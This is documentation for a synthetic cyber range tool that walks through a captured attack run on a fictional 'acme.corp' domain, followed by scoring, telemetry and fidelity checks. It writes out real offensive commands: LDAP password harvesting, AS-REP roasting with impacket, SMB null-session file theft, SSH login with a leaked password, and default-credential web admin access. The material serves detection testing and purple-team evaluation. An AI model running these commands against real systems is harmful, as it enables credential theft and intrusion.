# End-to-end walkthrough

This is a real run against `examples/acme.json` — a 9-host synthetic corporate range. Every
command and every block of output below was captured from an actual `docker compose` deployment;
nothing here is illustrative filler.

It shows the three things rangefinder exists to provide, in one narrative:

1. **A realistic target** — real tooling (nmap, ldapsearch, impacket, smbclient, curl) behaves as
   it would against real infra.
2. **Ground truth** — the range knows the intended attack paths and scores whether they completed.
3. **Measurement** — every interaction emits ECS telemetry, and facade fidelity is verifiable.

---

## 0. The range

`examples/acme.json` describes `acme.corp` — a domain with two DCs, a file server, web/app/mail
hosts, workstations, and a jump box — plus AD identities and five objectives. One file:

```
10.20.0.10  DC01    windows_server_2022   dns kerberos ldap smb rdp banner
10.20.0.20  FS01    windows_server_2019   smb rdp
10.20.0.30  WEB01   ubuntu_22_04          http ssh
10.20.0.50  JUMP01  ubuntu_22_04          ssh
… (9 hosts total)
```

## 1. Build & deploy

```bash
docker build -t rangefinder:latest .                         # facade runtime image
docker build -t rangefinder-attacker:latest docker/attacker  # attacker toolbox
rangefinder gen examples/acme.json -o build/                 # -> build/docker-compose.yml + config.json
docker compose -f build/docker-compose.yml up -d             # 9 containers, one per host
```

The generated compose gives each host its own container and static IP on a user-defined bridge, and
grants unprivileged port binding per-container (non-root, no `--privileged`):

```json
"networks": { "range": { "driver": "bridge",
  "ipam": { "config": [{ "subnet": "10.20.0.0/24", "gateway": "10.20.0.1" }] } } }

"dc01": {
  "image": "rangefinder:latest",
  "command": ["run", "--host", "dc01", "--config", "/range/config.json"],
  "networks": { "range": { "ipv4_address": "10.20.0.10" } },
  "sysctls": ["net.ipv4.ip_unprivileged_port_start=0"]
}
```

Tooling below runs from the attacker container (`--profile attacker`, source `10.20.0.2`); Kerberos
roasting uses impacket from the operator host (`10.20.0.1`).

## 2. Recon — `nmap -sV`

```
$ nmap -sV -Pn 10.20.0.10 10.20.0.30
Nmap scan report for acme-dc01 (10.20.0.10)
53/tcp   open   domain?
88/tcp   open   kerberos-sec   (server time: 2026-07-04 14:29:55Z)
389/tcp  open   ldap           (Anonymous bind OK)
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server?
Nmap scan report for acme-web01 (10.20.0.30)
22/tcp   open   ssh    OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http   nginx 1.18.0 (Ubuntu)
```

Real version detection against facades: nmap fingerprints the DC's services (note the live Kerberos
server time and "Anonymous bind OK"), and web01's OpenSSH/nginx banners.

## 3. Harvest credentials

**Anonymous LDAP leak** — the `svc-sql` service account's password is exposed in its `description`
(a classic AD misconfiguration), along with its Kerberoastable SPN:

```
$ ldapsearch -x -H ldap://10.20.0.10 -b "DC=acme,DC=corp" "(sAMAccountName=svc-sql)"
sAMAccountName: svc-sql
servicePrincipalName: MSSQLSvc/app01.acme.corp:1433
description: SQL Server service account - pwd Summ3r2025! (rotate quarterly)
```

**AS-REP roasting** — `svc-web` has pre-auth disabled, so the KDC hands out a real, crackable hash:

```
$ GetNPUsers.py acme.corp/ -no-pass -usersfile users.txt -dc-ip 10.20.0.10
$krb5asrep$23$svc-web@ACME.CORP:d7bcc38e0af0b3e514d0109e98764949$4889b248e53f14be…
```

This is a genuine `$krb5asrep$` ticket — feed it to hashcat mode 18200 and it cracks to
`Autumn2025!`. (Kerberoasting via `GetUserSPNs.py` is a known gap — it needs a signed LDAP bind the
backend doesn't implement; the roast itself works via the AS→TGS flow.)

## 4. Loot & foothold

**SMB null-session** enumerates and reads restricted shares on the file server:

```
$ smbclient -N -L //10.20.0.20
  Sharename   Type   Comment
  PUBLIC      Disk   Company-wide
  FINANCE     Disk   Finance dept (restricted)
  HR          Disk   HR dept (restricted)
  IT          Disk   IT dept

$ smbclient -N //10.20.0.20/HR -c "get salaries-2025.csv.txt -"
name,salary
A.Jones,54000
…
$ smbclient -N //10.20.0.20/IT -c "get credentials/vault-export.txt -"
sql: svc-sql / Summ3r2025!
esx-root: R00tPa$$
```

**SSH foothold** on the jump box, and **breaking the web admin panel**:

```
$ sshpass -p acme123 ssh admin@10.20.0.50 whoami        # -> decoy shell (auth succeeds)
$ curl -o /dev/null -w "%{http_code}" http://10.20.0.30/admin           # 401 (Basic realm "ACME Admin")
$ curl -o /dev/null -w "%{http_code}" -u admin:admin http://10.20.0.30/admin   # 200
```

## 5. Ground truth — `rangefinder score`

The range declares the intended objectives (including an ordered kill-chain). Score the telemetry
the attacks produced against them:

```
$ rangefinder score examples/acme.json telemetry.jsonl
Scoring: acme   (129 events, 5 scoreable objectives)

  [MET     ] obj-svc-sql-cred  —  Recover the svc-sql credential
             first via "read the IT credential vault over SMB" … by 10.20.0.2 (smb_file_access)
  [MET     ] obj-hr-data  —  Access HR salary data
             first via "read HR salaries over SMB" … by 10.20.0.2 (smb_file_access)
  [MET     ] obj-ssh-foothold  —  Gain an SSH foothold
             first via "successful SSH login" … by 10.20.0.2 (ssh_auth)
  [MET     ] obj-admin-panel  —  Break into the web admin panel
             first via "authenticated to /admin" … by 10.20.0.2 (http_auth)
  [MET     ] obj-killchain  —  Foothold then data theft
             kill chain completed … by 10.20.0.2:
               1. SSH foothold          at 14:32:32.936Z (ssh_auth)
               2. read a file over SMB  at 14:32:32.979Z (smb_file_access)

Summary: 5/5 objectives met
```

This is the purple-team payoff: **the range tells you not just what the attacker touched, but
whether each intended path completed** — including reconstructing the kill-chain as an ordered,
same-source narrative with timestamps. That's the labelled ground truth a detection eval needs.
(An earlier partial run — recon + LDAP + SMB only — correctly scored **2/5**, so the scoring
discriminates; it isn't rubber-stamping.)

## 6. Telemetry — what the SOC sees

Every interaction emitted an ECS-aligned JSON event to the container's stdout (139 lines this run).
Attacks that matter raise `event.kind: "alert"`. Two representative events:

```json
{ "@timestamp": "2026-07-04T14:29:08.535Z",
  "event": { "kind": "alert", "category": ["authentication"], "action": "kerberos_as_rep",
             "outcome": "success", "dataset": "rangefinder.kerberos" },
  "source": { "ip": "10.20.0.1", "port": 50520 },
  "destination": { "ip": "10.20.0.10", "port": 88 },
  "service": { "type": "kerberos" } }

{ "@timestamp": "2026-07-04T14:31:09.055Z",
  "event": { "kind": "event", "category": ["file"], "action": "smb_file_access",
             "outcome": "success", "dataset": "rangefinder.smb" },
  "source": { "ip": "10.20.0.2", "port": 54070 },
  "destination": { "ip": "10.20.0.20", "port": 445 },
  "service": { "type": "smb" } }
```

Point `docker compose logs` at your SIEM and you have a labelled dataset for detection-rule testing —
no separate instrumentation.

## 7. Fidelity — `rangefinder verify`

Realism is a *verified* property, not an assertion. `verify` captures a live service, stands up the
generated facade in-process, probes both with the same client, and diffs protocol-aware equivalence
classes. Run against **real nginx**:

```
$ rangefinder verify http http://127.0.0.1:8088/     # 127.0.0.1:8088 = a real nginx container
Fidelity: http  http://127.0.0.1:8088/
  1/1 faithful (100.0%) from the consumer's perspective
  fidelity boundary:
    - uncaptured paths diverge: real 404 vs replica 404 for a path that was never probed
  detection: 7 telemetry event(s) emitted while probed
  => FAITHFUL & OBSERVABLE
```

The same harness verifies the `ldap`, `smb`, and `dns` facades against OpenLDAP, Samba, and CoreDNS.
It also states its own boundary (uncaptured paths), because a fidelity tool that hides its limits is
worthless.

## Teardown

```bash
docker compose -f build/docker-compose.yml down
```

---

## What this demonstrates

| Pillar | In this run |
|--------|-------------|
| **Realistic target** | nmap version-detected the facades; ldapsearch, impacket AS-REP roasting, smbclient, and curl all behaved as against real infra |
| **Ground truth** | 5/5 objectives scored, with the kill-chain reconstructed as an ordered same-source narrative |
| **Measurement** | 139 ECS telemetry events (alerts on the attacks); `verify` proved the facade faithful to real nginx |

One JSON file → a disposable, realistic, fully-instrumented target you can point automated attacks
(or an autonomous red-team agent) at, and measure exactly what happened. See
[DESIGN.md](../DESIGN.md) for the *why*.
